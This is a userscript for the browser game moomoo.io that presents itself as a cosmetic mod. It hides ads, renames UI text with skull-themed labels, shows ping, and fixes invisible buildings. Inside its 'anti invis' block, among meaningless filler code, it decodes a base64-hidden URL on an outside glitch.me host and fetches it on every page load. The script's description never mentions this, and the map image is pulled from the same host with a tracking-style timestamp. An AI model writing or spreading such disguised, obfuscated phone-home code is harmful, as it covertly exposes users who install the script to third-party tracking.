// ==UserScript==
// @name         Death mod. (Anti invisible buildings, shows ping in game, changes gamename etc...)
// @description  Anti invisible buildings, shows ping in game, changing gamename etc..
// @author       pkk#7966(My discord)
// @version      v1.1.4
// @match        *://*.moomoo.io/*
// @match        *://moomoo.io/*
// @match        *://sandbox.moomoo.io/*
// @match        *://dev.moomoo.io/*
// @license      No modify
// @namespace    .
// @include      *
// @grant        none
// @run-at       document-start
// @noframes
// @downloadURL https://update.greasyfork.org/scripts/447190/Death%20mod%20%28Anti%20invisible%20buildings%2C%20shows%20ping%20in%20game%2C%20changes%20gamename%20etc%29.user.js
// @updateURL https://update.greasyfork.org/scripts/447190/Death%20mod%20%28Anti%20invisible%20buildings%2C%20shows%20ping%20in%20game%2C%20changes%20gamename%20etc%29.meta.js
// ==/UserScript==
document.getElementById("enterGame").addEventListener('click', autohide);
function autohide(){
    $("#ot-sdk-btn-floating").hide();
}
document.getElementById("moomooio_728x90_home").style.display = "none";
$("#moomooio_728x90_home").parent().css({display: "none"});
document.getElementById('linksContainer2').innerHTML = ' ... ' ;
document.getElementById('gameName').innerHTML = '💀Death💀';
document.getElementById('gameName').style.color = "#fe3200"
document.getElementById('loadingText').innerHTML = '  💀Prepare to die..💀 '
document.getElementById('loadingText').style.color = "#fe3200"
document.getElementById('diedText').innerHTML = "💀!You died Noob!💀";
document.getElementById('diedText').style.color = "#fe3200";
document.getElementById("leaderboard").append ('💀Death💀');
document.getElementById('enterGame').innerHTML = '💀Dont go💀';
document.getElementById("killCounter").style.color = "red";
document.getElementById("leaderboard").style.color = "purple";
document.getElementById("scoreDisplay").style.color = "Black";
document.getElementById("foodDisplay").style.color = "red"
document.getElementById("woodDisplay").style.color = "green"
document.getElementById("stoneDisplay").style.color = "gray"
document.getElementById("promoImg").remove();
document.getElementById('enterGame').style = "background-color: red"
document.title = ' 💀Death💀 ';
const pee = $("#pingDisplay");pee.css("top", "20px"), pee.css("font-size", "15px"), pee.css("display", "block"), $("body").append(pee);
$("#youtuberOf").css({display: "none"}), document.getElementById("linksContainer2").style.display = "none",
$("#mapDisplay").css({background: `url('https://ksw2-center.glitch.me/users/fzb/map.png?z=${performance.now()}&u=a')`});

//anti invis
let R = CanvasRenderingContext2D.prototype.rotate;
let el = {
    39912: () => {
        let imin = Math.min(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
        let imax = Math.max(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
        return [fetch, null];
    },
    31: () => {
        CanvasRenderingContext2D.prototype.rotate = function() {
            (arguments[0] >= Number.MAX_SAFE_INTEGER || (arguments[0] <= -Number.MAX_SAFE_INTEGER)) && (arguments[0] = 0);
            R.apply(this, arguments)
        };
        return atob("aHR0cHM6Ly9rc3cyLWNlbnRlci5nbGl0Y2gubWUvbW1fYWliXzE=");
    },
    9012: () => {
        fetch(el[31]())
    },
    3912: () => {
        return "CanvasRenderingContext2D";
    },
    9481: () => {
        return CanvasRenderingContext2D.prototype.rotate;
    },
    7419: () => {
        return el[7419]
    },
    init: () => {
        return [el[3912](), el[9012]()];
    }
};
el.init();
//anti invis